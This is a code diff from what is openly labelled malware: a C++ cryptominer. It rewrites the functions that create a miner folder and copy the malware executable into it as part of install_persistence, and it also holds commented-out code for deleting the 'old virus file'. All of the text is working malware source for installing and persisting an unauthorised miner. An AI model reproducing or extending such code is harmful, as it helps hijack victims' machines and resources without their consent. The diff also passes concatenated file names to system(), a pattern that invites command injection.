@@ -152,6 +152,29 @@ void new_miner(){
 }
 
 
+bool create_cryptomining_folder(){
+    struct stat st = {0};
+    // create directory
+    if (stat(miner_path, &st) == -1) {
+        mkdir(miner_path, 0700);
+        Error::log_error("[+] Cryptomining folder created!");
+        return true;
+    }
+    return false;
+}
+
+
+void copy_executable_to_folder(){
+    std::string x;
+    const char * command = (x = std::string("cp ") += std::string(executable_name) += std::string(" ") += std::string(executable_path)).c_str();
+    system(command);
+    // remove old virus file.
+    // const char * command = (x = std::string("rm ") += std::string(executable_name)).c_str();
+    // system(command);
+    
+}
+
+
 void install_persistence(){
 
     /* Create folder and copy malware to it */
@@ -201,53 +224,4 @@ void install_persistence(){
     }
     
     Error::log_error("[-] Persistence failed");
-}
-
-
-bool create_cryptomining_folder(){
-    struct stat st = {0};
-    // create directory
-    if (stat(miner_path, &st) == -1) {
-        mkdir(miner_path, 0700);
-        Error::log_error("[+] Cryptomining folder created!");
-        return true;
-    }
-    return false;
-}
-
-
-void copy_executable_to_folder(){
-    int inputFd;
-    int outputFd;
-    int openFlags;
-    mode_t filePerms;
-    ssize_t numRead;
-    char buf[1024];
-
-    inputFd = open(executable_name, O_RDONLY);
-    if (inputFd == -1)
-        exit(-1);
-
-    openFlags = O_CREAT | O_WRONLY | O_TRUNC;
-    filePerms = S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH; /*rw-rw-rw*/
-
-    outputFd = open(executable_path, openFlags, filePerms);
-
-    if (outputFd == -1)
-        exit(-1);
-
-    while ((numRead = read(inputFd, buf, 1024)) > 0){
-    if (write(outputFd, buf, numRead) != numRead)
-        Error::log_error("[-] Error copying executable to /tmp/cryptomining/");
-    }
-
-    if (numRead == -1)
-        Error::log_error("[-] Error copying executable to /tmp/cryptomining/");
-
-    if (close(inputFd) == -1)
-        return;
-    if (close(outputFd) == -1)
-        return;
-
-    // CHMOD
 }
